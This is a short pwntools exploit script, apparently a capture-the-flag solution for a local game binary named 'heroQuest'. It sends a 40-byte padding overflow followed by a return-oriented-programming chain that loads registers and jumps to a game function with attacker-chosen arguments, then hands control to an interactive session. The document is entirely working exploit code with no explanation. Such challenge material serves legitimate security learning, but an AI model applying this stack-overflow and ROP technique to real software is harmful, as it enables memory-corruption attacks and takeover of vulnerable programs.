from pwn import *

p = process("./heroQuest")

# fight(char *name, int player_health, int boss_health)

payload = b'A' * 40
payload += p64(0x00000000004017ab) # pop rdi
payload += p64(0x4025fb)
payload += p64(0x00000000004017a9) # pop rsi ; pop r15 ; ret
payload += p64(0x999999)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x00000000004014db)

p.sendlineafter(b'file!', b'FFFF')
p.sendlineafter(b'.', b'w')
p.sendlineafter(b'back', b'r')
p.sendlineafter(b'file:', payload)

p.interactive()
